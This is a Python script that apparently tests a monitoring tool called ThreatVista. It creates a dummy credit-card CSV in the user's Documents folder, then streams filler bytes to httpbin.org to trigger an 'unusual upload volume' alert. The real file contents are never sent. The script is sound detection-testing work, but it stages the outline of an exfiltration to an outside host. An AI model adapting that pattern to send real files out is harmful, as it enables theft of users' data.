import os
import time
import socket

def simulate_data_exfiltration():
    print("[*] Starting Data Exfiltration Simulation")
    base = os.path.expanduser("~")
    target_dir = os.path.join(base, "Documents")
    if not os.path.exists(target_dir):
        os.makedirs(target_dir, exist_ok=True)
        
    sensitive_file = os.path.join(target_dir, "customer_credit_cards_export.csv")
    
    print(f"[*] Creating sensitive dummy file: {sensitive_file}")
    with open(sensitive_file, "w") as f:
        f.write("CardNumber,Name,CVV,Expiry\n")
        for i in range(5000):
            f.write(f"4111-1111-1111-11{i:02d},John Doe,123,12/26\n")
            
    print("[*] Opening file to keep a file handle active...")
    # Keep the file handle open so the agent's network_monitor catches it!
    f = open(sensitive_file, "r")
    content = f.read()
    
    print("[*] Initiating high-volume outbound network traffic to simulate exfiltration...")
    print("    (Uploading data to a dummy local/remote socket...)")
    
    try:
        # Create a socket and connect to httpbin or local port to simulate an upload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("httpbin.org", 80))
        s.sendall(b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 100000000\r\n\r\n")
        
        # Stream data continuously to trigger the network spike
        chunk = b"A" * 65536
        for _ in range(500): # Send a lot of MBs
            s.sendall(chunk)
            time.sleep(0.01)
            
        print("[+] Network spike generated successfully.")
    except Exception as e:
        print(f"[-] Network simulation error: {e}")
    finally:
        f.close()
        try:
            s.close()
        except:
            pass

    print("[+] Exfiltration simulation complete!")
    print("[!] Check the ThreatVista dashboard for 'Unusual network upload volume' alerts.")

if __name__ == "__main__":
    simulate_data_exfiltration()
